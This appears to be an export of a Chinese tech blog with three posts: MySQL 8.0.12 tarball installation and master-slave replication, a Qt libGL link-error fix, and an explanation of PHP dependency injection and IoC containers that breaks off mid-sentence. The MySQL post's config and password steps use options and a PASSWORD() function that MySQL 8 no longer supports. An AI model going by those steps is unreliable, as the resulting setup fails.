<p>1.首先下载MySQL安装包，地址：<a href="https://dev.mysql.com/downloads/mysql/" target="_blank" rel="noopener">https://dev.mysql.com/downloads/mysql/</a> 选择符合自己需要的下载 </p>
<img src = "/images/old/5f6e3e27ly1fvpadrk2mvj210s0eygnn.jpg" />

<p>这里以8.0.12版本为例，下载tar压缩包后解压，其目录结构如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">drwxrwxr-x  2 jwang jwang   4096 Sep 28 15:38 bin</span><br><span class="line">drwxrwxr-x  2 jwang jwang   4096 Sep 28 15:38 docs</span><br><span class="line">drwxrwxr-x  3 jwang jwang   4096 Sep 28 15:37 include</span><br><span class="line">drwxrwxr-x  5 jwang jwang   4096 Sep 28 15:38 lib</span><br><span class="line">-rw-r--r--  1 jwang jwang 301518 Jun 29 00:18 LICENSE</span><br><span class="line">drwxrwxr-x  4 jwang jwang   4096 Sep 28 15:37 man</span><br><span class="line">-rw-r--r--  1 jwang jwang    687 Jun 29 00:18 README</span><br><span class="line">drwxrwxr-x 28 jwang jwang   4096 Sep 28 15:38 share</span><br><span class="line">drwxrwxr-x  2 jwang jwang   4096 Sep 28 15:38 support-files</span><br></pre></td></tr></table></figure>
<p>其中bin目录存放的就是各种可执行文件</p>
<p>假设现在解压后的文件夹名字叫mysql8，位于 /data 目录下</p>
<p>先做准备一些工作, 创建mysql用户，分配权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">groupadd mysql</span><br><span class="line">useradd -r -g mysql -s &#x2F;bin&#x2F;false mysql</span><br><span class="line">chown mysql:mysql mysql8</span><br></pre></td></tr></table></figure>
<p>接下来有一个非常重要的操作，就是初始化MySQL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;data&#x2F;mysql8&#x2F;bin&#x2F;mysqld --initialize --user&#x3D;mysql</span><br></pre></td></tr></table></figure>
<p>默认情况下, 上面这个操作会在一些目录创建一些文件，然而实际操作中，我们一般会指定一些配置参数,创建一个文件 /data/3306/my.cnf, 这里有一个配置文件供大家参考:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">server_id &#x3D; 1100</span><br><span class="line">user    &#x3D; mysql</span><br><span class="line">port    &#x3D; 3306</span><br><span class="line">datadir &#x3D; &#x2F;data&#x2F;3306&#x2F;data</span><br><span class="line">basedir &#x3D; &#x2F;data&#x2F;mysql8</span><br><span class="line">log-bin &#x3D; &#x2F;data&#x2F;3306&#x2F;data&#x2F;binlog</span><br><span class="line">socket  &#x3D; &#x2F;data&#x2F;3306&#x2F;tmp&#x2F;mysql.sock</span><br><span class="line">pid-file &#x3D; &#x2F;data&#x2F;3306&#x2F;mysql.pid</span><br><span class="line">log-error &#x3D; &#x2F;data&#x2F;3306&#x2F;log&#x2F;mysql_error.log</span><br><span class="line">relay-log &#x3D; &#x2F;data&#x2F;3306&#x2F;relaylog</span><br><span class="line">relay-log-index &#x3D; &#x2F;data&#x2F;3306&#x2F;relaylog.index</span><br><span class="line"></span><br><span class="line">default-storage-engine &#x3D; Innodb</span><br><span class="line">sql-mode&#x3D;NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES</span><br><span class="line"></span><br><span class="line">#慢查询</span><br><span class="line">long_query_time &#x3D; 1</span><br><span class="line">slow-query-log &#x3D; on</span><br><span class="line">slow_query_log_file &#x3D; &#x2F;data&#x2F;mysqld&#x2F;3306&#x2F;log&#x2F;mysql_slow.log</span><br><span class="line">#记录更多的日志</span><br><span class="line">log_slow_admin_statements</span><br><span class="line"></span><br><span class="line">#master&#x2F;slave</span><br><span class="line">slave_skip_errors&#x3D;1032,1062</span><br><span class="line">log-slave-updates</span><br><span class="line">master-info-repository&#x3D;TABLE</span><br><span class="line">report_host&#x3D;192.168.1.100</span><br><span class="line">report_port&#x3D;3306</span><br><span class="line">enforce_gtid_consistency</span><br><span class="line">gtid-mode&#x3D;ON</span><br><span class="line"></span><br><span class="line">#charset</span><br><span class="line">character-set-server &#x3D; utf8</span><br><span class="line"></span><br><span class="line">#log_warnings &#x3D; 0</span><br><span class="line">open_files_limit    &#x3D; 10240</span><br><span class="line">#参考:短时间内最大连接</span><br><span class="line">back_log &#x3D; 1024</span><br><span class="line"></span><br><span class="line">#binlog</span><br><span class="line">binlog_cache_size &#x3D; 4M</span><br><span class="line">binlog_format &#x3D; MIXED</span><br><span class="line">max_binlog_cache_size &#x3D; 8M</span><br><span class="line">max_binlog_size &#x3D; 1G</span><br><span class="line">expire_logs_days &#x3D; 2</span><br><span class="line"></span><br><span class="line">#cache</span><br><span class="line">query_cache_type &#x3D; 1</span><br><span class="line">query_cache_limit &#x3D; 2M</span><br><span class="line">query_cache_size &#x3D; 64M</span><br><span class="line"></span><br><span class="line">#buffer</span><br><span class="line">join_buffer_size &#x3D; 32M</span><br><span class="line">sort_buffer_size &#x3D; 32M</span><br><span class="line">#???</span><br><span class="line">read_rnd_buffer_size &#x3D; 16M</span><br><span class="line"></span><br><span class="line">#innodb Dynamic&#x3D;NO</span><br><span class="line">innodb_read_io_threads &#x3D; 8</span><br><span class="line">innodb_write_io_threads &#x3D; 4 </span><br><span class="line">innodb_buffer_pool_size &#x3D; 10240M </span><br><span class="line">#数据刷新方式</span><br><span class="line">innodb_flush_method &#x3D; O_DIRECT</span><br><span class="line">#单个连接所分配的内存大小</span><br><span class="line">innodb_sort_buffer_size &#x3D; 4M</span><br><span class="line"></span><br><span class="line">#只限slave配置</span><br><span class="line">innodb_flush_log_at_trx_commit &#x3D; 0</span><br><span class="line"></span><br><span class="line">#thread</span><br><span class="line">thread_cache_size &#x3D; 256</span><br><span class="line"></span><br><span class="line">#connections</span><br><span class="line">max_connections &#x3D; 2048 </span><br><span class="line">max_connect_errors &#x3D; 10240</span><br><span class="line">init-connect&#x3D;&#39;SET NAMES utf8&#39;</span><br><span class="line">#跳过反向解析</span><br><span class="line">skip-name-resolve &#x3D; 1</span><br><span class="line"></span><br><span class="line">explicit_defaults_for_timestamp &#x3D; TRUE</span><br><span class="line">#调用group_cat</span><br><span class="line">group_concat_max_len &#x3D; 204800</span><br></pre></td></tr></table></figure>
<p>具体的配置项这么不细说了，有些可能需要根据你服务器的配置做一些调整！然后执行下面的命令初始化：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;data&#x2F;mysql8&#x2F;bin&#x2F;mysqld --defaults-file&#x3D;&#x2F;data&#x2F;3306&#x2F;my.cnf --initialize --explicit_defaults_for_timestamp --user&#x3D;mysql</span><br></pre></td></tr></table></figure>
<p>如果没有报错，你应该可以在 /data/3306 目录里面看到一些生成的文件，请注意这时候在 /data/3306/log/mysql_error.log 文件里面会有一个生成的临时密码,<br>类似这样的语句： A temporary password is generated for root@localhost: h9iec,Z,Hel1</p>
<p>然后使用下面语句启动MySQL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;data&#x2F;mysql8&#x2F;bin&#x2F;mysqld_safe --defaults-file&#x3D;&#x2F;data&#x2F;3306&#x2F;my.cnf --ledir&#x3D;&#x2F;data&#x2F;mysql8&#x2F;bin&#x2F; &amp;</span><br></pre></td></tr></table></figure>
<p>如果没有报错，你可以使用ps查看一下进程，应该是启动了！</p>
<p>可以使用以下命令连接MySQL：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;data&#x2F;mysql8&#x2F;bin&#x2F;mysql -S &#x2F;data&#x2F;3306&#x2F;mysql.sock -uroot -p</span><br></pre></td></tr></table></figure>
<p>修改密码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set password&#x3D;password(&#39;yourpass&#39;);</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里需要注意的是 server_id 不能重复，建议以ip最后2位为参考，假设这里主服务器ip为192.168.1.100，从服务器ip为192.168.1.105</p>
</blockquote>
<h2 id="2-配置主从"><a href="#2-配置主从" class="headerlink" title="2.配置主从"></a>2.配置主从</h2><p>看到这里说明这两台Mysql服务器已经跑起来了，接下来就是配置主从关系</p>
<p>首先，得在主服务器MySQL里面新建一个账号专门用于同步：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create user &#39;repl&#39;@&#39;192.168.%&#39; identified by &#39;repl_pass&#39;;</span><br><span class="line">grant select,replication slave, REPLICATION CLIENT on *.* to &#39;repl&#39;@&#39;192.168.%&#39;;</span><br></pre></td></tr></table></figure>
<p>为了安全考虑，可以限定其ip范围，并且只授予给定权限，当然你也可以用root账号，只要有权限，应该都没问题</p>
<p>如果你的主服务器已经有数据的话，有2种选项，一种是不做处理，建立主从关系之后让MySQL自动同步，但是如果数据量大的话可能比较慢，另一种，<br>在主库上面备份数据，导入从服务器，这里有一个备份命令可以参考：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;data&#x2F;mysql8&#x2F;bin&#x2F;mysqldump --skip-lock-tables --single-transaction --flush-logs --hex-blob --master-data&#x3D;2 --databases yourdatabases -S&#x2F;data&#x2F;3306&#x2F;mysql.sock -uroot -pyourpass --result-file&#x3D;&#x2F;data&#x2F;backup.sql</span><br></pre></td></tr></table></figure>
<p>如果你的数据真的非常大，建议在导入从库的时候在备份的文件里面加入一行配置暂时关闭binlog：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sed -i &quot;1iset sql_log_bin&#x3D;off;\n&quot; &#x2F;data&#x2F;backup.sql</span><br></pre></td></tr></table></figure>
<p>一切搞定之后，只剩下最后一步了，设置主从关系：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stop slave;</span><br><span class="line">CHANGE MASTER TO MASTER_HOST&#x3D;&#39;192.168.1.100&#39;, </span><br><span class="line">MASTER_PORT&#x3D;3306,</span><br><span class="line">MASTER_USER&#x3D;&#39;repl&#39;, </span><br><span class="line">MASTER_PASSWORD&#x3D;&#39;repl_pass&#39;, </span><br><span class="line">#MASTER_LOG_FILE&#x3D;&#39;binlog.004335&#39;, </span><br><span class="line">#MASTER_LOG_POS&#x3D;120; </span><br><span class="line">start slave;</span><br></pre></td></tr></table></figure>
<p>注意，如果你是导入主库的数据话，你会发现在备份的文件前面有一行是这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CHANGE MASTER TO MASTER_LOG_FILE&#x3D;&#39;binlog.004335&#39;, MASTER_LOG_POS&#x3D;120;</span><br></pre></td></tr></table></figure>
<p>这就是注释里面需要的binlog文件和其位置，全新的库的话就不需要</p>
<p>最后，show slave status\G 查看一下从库的状态</p>
]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt-运行-cant&#39;t-find-lGL</title>
    <url>/2018/linux/qt-can-not-find-igl.html</url>
    <content><![CDATA[<p><strong>实验问题：运行最简单”hello world!”,出现can’t find -lGL的问题</strong></p>
<p><strong>实验阵地： ubuntu14.04+qt5.2</strong></p>
<p><strong>问题分析</strong>：<br>出现该类问题的原因有2个： </p>
<p>(1)没有安装libGL; </p>
<p>(2)libGL没有正确链接。</p>
<a id="more"></a>

<p><strong>问题解答</strong>： </p>
<p>（1）如果是问题1,这个好办。只要安装libGL即可。这个在其他博客中也都有提到, 如<a href="https://blog.sina.com.cn/s/blog_500bd63c0102uzmt.html" target="_blank" rel="noopener">https://blog.sina.com.cn/s/blog_500bd63c0102uzmt.html</a><br>只需终端执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install build-essential </span><br><span class="line">$ sudo apt-get install libgl1-mesa-dev</span><br></pre></td></tr></table></figure>

<p>安装libGL即可。（libGL是openGL的库） </p>
<p>（2）如果是问题2,就稍微难办一点。<br>首先，我们利用命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ &#x2F;sbin&#x2F;ldconfig -v | grep GL</span><br></pre></td></tr></table></figure>

<p>查看所有有关GL的链接库的链接关系。<br>如果是问题2，则会有这样的打印信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;sbin&#x2F;ldconfig.real: Cannot stat &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;mesa&#x2F;libGL.so: No such file or directory</span><br></pre></td></tr></table></figure>

<p>表示”无法获取libGL的链接信息：没有该文件或目录”。我们进入/usr/lib/x86_64-linux-gnu/mesa/</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;mesa&#x2F;</span><br></pre></td></tr></table></figure>

<p>确实能找到libGL.so。但因为不存在与之相关的硬链接，而导致libGL.so失效。<br>这时候，应该怎么办呢？ </p>
<p>a)首先我们进一步确认一下libGL.so是否失效。（毕竟之后涉及到在/usr/lib/x86_64-linux-gnu文件夹下删除，一不小心删错了，可是要命的）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ls -l libGL.so</span><br></pre></td></tr></table></figure>

<p>查看libGL的硬链接，如果libGL存在硬链接的话，会出现类似信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lrwxrwxrwx 1 root root 13 12月  4 20:42 libGL.so -&gt; ..&#x2F;libGL.so.1</span><br></pre></td></tr></table></figure>

<p>如果出现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 libGL.so</span><br></pre></td></tr></table></figure>

<p>或其他错误信息，则说明这个libGL.so已经失效。 </p>
<p>b)之后，搜索是否存在libGL.so的硬链接。（一般如果第一步，安装已经做过的话，是肯定存在的）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd </span><br><span class="line">$ sudo find &#x2F;usr&#x2F;lib&#x2F; -name libGL.so*</span><br></pre></td></tr></table></figure>

<p>打印信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;mesa&#x2F;libGL.so</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libGL.so.1.0.0</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libGL.so</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libGL.so.1</span><br></pre></td></tr></table></figure>

<p>我们发现在/usr/lib/x86_64-linux-gnu/文件夹下存在硬链接libGL.so.1.0.0<br>接下来，我们的问题就只剩下如何让/usr/lib/x86_64-linux-gnu/mesa/libGL.so关联上/usr/lib/x86_64-linux-gnu/libGL.so.1.0.0 </p>
<p>由于在/usr/lib/x86_64-linux-gnu/中libGL.so.1是libGL.so.1.0.0的软链接，所以我们只要将/usr/lib/x86_64-linux-gnu/mesa/libGL.so关联上/usr/lib/x86_64-linux-gnu/libGL.so.1即可 </p>
<p>执行以下操作:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;mesa&#x2F;</span><br><span class="line">$ sudo rm libGL.so #删除libGL.so</span><br><span class="line">$ sudo ln -s ..&#x2F;libGL.so.1 libGL.so #创建软链接</span><br></pre></td></tr></table></figure>

<p>重新运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -l libGL.so</span><br></pre></td></tr></table></figure>

<p>这时应该会有打印信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lrwxrwxrwx 1 root root 13 12月  4 20:42 libGL.so -&gt; ..&#x2F;libGL.so.1</span><br></pre></td></tr></table></figure>

<p>再次运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#x2F;sbin&#x2F;ldconfig -v | grep GL</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;sbin&#x2F;ldconfig.real: Cannot stat &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;mesa&#x2F;libGL.so: No such file or directory</span><br></pre></td></tr></table></figure>
<p>上述错误会消失。 </p>
<p>重新编译qt，编译成功！</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>QT</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP依赖注入和控制反转</title>
    <url>/2018/coding/di-and-ioc.html</url>
    <content><![CDATA[<p>这2个其实都算得上是一种设计模式或者说是一种软件设计思想，目的都是为了增加软件可维护性和扩展性，比如在Java Web框架SpringMVC 和PHP Web框架laravel里面都有应用。</p>
<p>首先得理解什么叫依赖？从宏观上看，得益于开源软件运行的兴起，很多时候我们写项目并不是什么都是从零开始，我们往往会利用很多现成的开源代码进行快速开发，能不重复造轮子最好，所以我们往往依赖很多开源组件。gradle、npm、composer 等工具的部分功能就是解决项目依赖问题。</p>
<a id="more"></a>

<p>从微观上看，在实际写代码里面，对象与对象之间也会产生依赖关系，比如一个数据库查询类需要用到一个数据库连接、一个文章评论类用到一个文章，这里的依赖主要指对象之间的关系。</p>
<p>举个栗子，在一个 SessionService 里面你需要一个 FileSession ：</p>
<h2 id="普通写法："><a href="#普通写法：" class="headerlink" title="普通写法："></a>普通写法：</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileSession</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $file;</span><br><span class="line"></span><br><span class="line">    ... more code</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"set $name = $value into $this-&gt;file\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"get $name value\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>service类：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SessionService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $sessionHandler;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sessionHandler = <span class="keyword">new</span> FileSession()；</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sessionHandler-&gt;set($name, $value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;sessionHandler-&gt;get($name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...more code</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这种普通写法里面，当我们需要一个 sessionHandler 的时候我们是直接在构造函数里面实例化，这样没啥问题，确实解决了依赖问题。但是依赖注入的另一个词“注入”更强调的是一种从外部而来的，而不是内部。</p>
<img src = "/images/old/5f6e3e27ly1fxq63pd6oej20ct0c03ze.jpg" />

<p>改造如下：</p>
<h2 id="依赖注入写法："><a href="#依赖注入写法：" class="headerlink" title="依赖注入写法："></a>依赖注入写法：</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SessionService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $sessionHandler;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($sessionHandler)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sessionHandler = $sessionHandler；</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sessionHandler-&gt;set($name, $value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;sessionHandler-&gt;get($name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...more code</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种写法要求你在使用service的时候从外部传入一个handler，这就实现了依赖注入，注入的方式有很多种，刚才这种可以称之为构造器注入，还有一种叫setter注入，比如说，我们可以在service里面里面提供一个setter函数用于设置所需的handler：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setSessionHandler</span><span class="params">($sessionHandler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;sessionHandler = $sessionHandler</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种写法有哪些好处呢？一个是解耦，假如说这个FileSession实例化的时候还需要其它操作，比如传入一个配置参数，原本的写法可能就需要更改service类了，在构造函数里面啪啪啪写一堆。还有就是方便测试，既然解耦了就可以很方便的进行单元测试。另一个是控制反转，就是说这个FileSession外部传入的，是service类无法控制的，也就说控制权在于外部。</p>
<p>很多软件在设计的时候都采用分层结构，最典型的就是计算机网络，Http协议依赖TCP协议，层与层之间通过约定的的接口进行交互，既减少了代码的复杂度，也提高了可维修性。比如说你哪一天重构了FileSession，没问题，只要你保证所有方法的返回结果和之前一样就行。</p>
<p>为了更灵活的运用这种注入机制我们可能需要采用一个接口去约束，举个例子，我们先增加一个接口sessionHandler：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">SessionHandler</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($name)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们约定，只要你实现了这个接口，你就可以当一个sessionHandler，你就可以用来处理session，至于你怎么实现，service不管，比如说我们换一个redis：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedisHandler</span> <span class="title">implments</span> <span class="title">SessionHandler</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $redisInstance;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;redisInstance = <span class="keyword">new</span> Redis();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;redisInstance-&gt;set($name, $value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;redisInstance-&gt;get($name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这时候我们可以在service的构造函数稍作修改，增加一个类型约束：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(SessionHandler $sessionHandler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;sessionHandler = $sessionHandler；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样的设计之后，好处显而易见，我们可以很轻松替换掉之前的fileSession，不改动service的一行代码，只要按照sessionHandler的接口去实现相应的方法就行，在laravel里面这样的接口就叫做 Contracts，下面就是框架里面的Cache缓存的 Contracts：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Contracts</span>\<span class="title">Cache</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Store</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Retrieve an item from the cache by key.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string|array  $key</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Retrieve multiple items from the cache by key.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Items not found in the cache will have a null value.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  array  $keys</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">many</span><span class="params">(array $keys)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Store an item in the cache for a given number of minutes.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string  $key</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  mixed   $value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  float|int  $minutes</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">put</span><span class="params">($key, $value, $minutes)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Store multiple items in the cache for a given number of minutes.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  array  $values</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  float|int  $minutes</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">putMany</span><span class="params">(array $values, $minutes)</span></span>;</span><br><span class="line"></span><br><span class="line">    ... more code</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>据我看到的，在laravel框架里面自带了至少5种实现，分别是Array、File、Database、Memcached、Redis, 如果你愿意你也可以自己去实现这个 Contracts，然后替换到框架里面的，不过框架本身实现的已经非常优秀了，除非你写的更好，一般情况下不需要这样做，但是laravel提供了这种可能。<br>同样，在laravel框架里面session自带了Cache，Database，File这种几种实现，可以随意切换。</p>
<img src = "/images/old/5f6e3e27ly1fxq0xh7s02j20as0hiaaq.jpg" />

<hr>
<h2 id="IOC容器"><a href="#IOC容器" class="headerlink" title="IOC容器"></a>IOC容器</h2><p>说了最后，必须再说说IOC容器，IOC核心思想是通过IoC容器管理对象的生成、资源获取、销毁等生命周期，在IoC容器中建立对象与对象之间的依赖关系，IoC容器启动后，所有对象直接取用，调用层不再使用new操作符产生对象和建立对象之间的依赖关系。</p>
<p>简单理解就是不再使用new创建对象了，而且使用容器来管理对象，需要对象就从容器里面取，而且你只需要在参数上声明依赖，容器就直接给你对象了，炒鸡方便，比如在laravel里面，有很多这样的写法：</p>
